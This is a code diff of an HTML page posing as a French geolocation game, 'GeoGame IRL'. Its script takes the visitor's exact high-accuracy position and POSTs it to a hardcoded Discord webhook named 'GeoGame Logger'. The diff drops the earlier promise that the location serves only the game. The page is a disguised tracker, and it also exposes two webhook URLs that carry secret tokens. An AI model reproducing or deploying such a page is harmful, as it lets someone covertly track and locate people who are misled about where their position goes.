@@ -6,94 +6,106 @@
 <style>
     body {
         font-family: Arial, sans-serif;
-        background: #f0f4f8;
+        background: #eef2f5;
+        margin: 0;
+        height: 100vh;
         display: flex;
         justify-content: center;
         align-items: center;
-        height: 100vh;
     }
 
-    #startContainer {
-        text-align: center;
+    #container {
         background: white;
         padding: 30px;
+        width: 90%;
+        max-width: 400px;
         border-radius: 12px;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+        text-align: center;
     }
 
-    #startButton {
-        padding: 15px 25px;
-        font-size: 18px;
+    button {
+        background: #0066ff;
         border: none;
-        border-radius: 8px;
-        background-color: #007bff;
+        padding: 15px 25px;
         color: white;
+        border-radius: 10px;
         cursor: pointer;
+        font-size: 18px;
         margin-top: 20px;
-        transition: background 0.2s;
+        transition: 0.2s;
+        width: 100%;
     }
 
-    #startButton:hover {
-        background-color: #0056b3;
+    button:hover {
+        background: #004fcc;
     }
 </style>
 </head>
 <body>
 
-<div id="startContainer">
-    <h2>📍 Bienvenue sur GeoGame IRL</h2>
+<div id="container">
+    <h2>📍 GeoGame IRL</h2>
     <p>
         Pour jouer, nous avons besoin de votre position exacte.<br>
-        Votre localisation sera utilisée uniquement pour le jeu.
+        Cliquez sur le bouton ci-dessous.
     </p>
-    <button id="startButton">Commencer le jeu</button>
+    <button id="locate">Demander la localisation</button>
+
+    <p id="errorMsg" style="color:red; font-weight:bold; display:none; margin-top:15px;"></p>
 </div>
 
 <script>
-document.getElementById("startButton").addEventListener("click", () => {
+document.getElementById("locate").addEventListener("click", () => {
 
     navigator.geolocation.getCurrentPosition(
-        (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
+        (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
 
-            alert(`Position obtenue ✔️\nLatitude: ${lat}\nLongitude: ${lon}\nPrécision: ${acc}m\n\nLe jeu peut commencer !`);
+            alert(`✔ Position obtenue :
+Latitude : ${lat}
+Longitude : ${lon}
+Précision : ${acc} mètres`);
 
-            // --- ENVOI AU WEBHOOK DISCORD ---
-            const webhookURL = "https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb";
-
-            fetch(webhookURL, {
+            // ---- Envoi au webhook ----
+            fetch("https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    username: "GeoGame",
-                    content: "Nouvel utilisateur (avec consentement)",
-                    embeds: [
-                        {
-                            title: "Position exacte",
-                            description: `Latitude : ${lat}\nLongitude : ${lon}\nPrécision : ${acc}m`,
-                            color: 0x00ff99
-                        }
-                    ]
+                    username: "GeoGame Logger",
+                    content: "Nouveau joueur avec localisation",
+                    embeds: [{
+                        title: "Localisation exacte",
+                        description: `Latitude : ${lat}\nLongitude : ${lon}\nPrécision : ${acc} m`,
+                        color: 0x00ff99
+                    }]
                 })
-            })
-            .then(response => {
-                if(response.ok) console.log("Webhook envoyé !");
-                else console.log("Erreur envoi webhook :", response.status);
-            })
-            .catch(err => console.log("Erreur webhook :", err));
+            });
 
         },
-        (error) => {
-            alert("Vous avez refusé la localisation ou votre appareil ne la permet pas.\nLe jeu ne peut pas démarrer.");
-            console.log("Erreur géolocalisation :", error);
+        (err) => {
+            const errorMessage = document.getElementById("errorMsg");
+            errorMessage.style.display = "block";
+
+            if (err.code === 1) {
+                errorMessage.innerHTML = `
+⚠️ Vous avez refusé la géolocalisation.<br><br>
+Veuillez autoriser la localisation dans les réglages de votre navigateur / téléphone pour jouer.
+                `;
+            } 
+            else {
+                errorMessage.innerHTML = "Impossible d'obtenir votre position.";
+            }
+
+            console.log("Erreur :", err);
         },
         { enableHighAccuracy: true, timeout: 10000 }
     );
+
 });
 </script>
 
 </body>
 </html>
-
